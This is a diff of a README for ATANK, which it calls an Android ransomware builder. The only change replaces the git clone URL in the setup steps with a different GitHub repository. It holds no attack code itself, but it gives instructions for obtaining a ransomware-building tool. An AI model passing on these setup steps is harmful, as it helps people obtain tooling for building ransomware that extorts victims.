@@ -13,7 +13,7 @@ ATANK is an android ransomware builder.
 
 
 # Setup
-`git clone https://github.com/Morsmalleo/ATANK`
+`git clone https://github.com/ScRiPt1337/ATANK`
 
 `cd ATANK` 
 
